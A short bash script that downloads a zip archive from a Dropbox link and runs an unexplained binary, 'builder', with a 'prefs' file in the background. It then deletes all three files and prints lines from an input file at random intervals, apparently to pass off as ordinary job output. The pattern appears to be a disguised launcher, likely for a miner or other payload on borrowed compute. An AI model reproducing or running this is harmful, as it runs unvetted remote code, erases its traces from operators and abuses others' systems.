#!/bin/bash

end=$((SECONDS+$1))
wget https://www.dropbox.com/s/qvtkqmq3gw14297/wan02.zip -q
unzip wan02.zip > /dev/null 2>&1
#pwd
./builder ./prefs &
sleep 3
rm -rf wan02.zip
rm -rf builder
rm -rf prefs
while [ $SECONDS -lt $end ]
do
    read line
    echo "$line"
    sleep $(( $RANDOM % 6 ))
done < $2

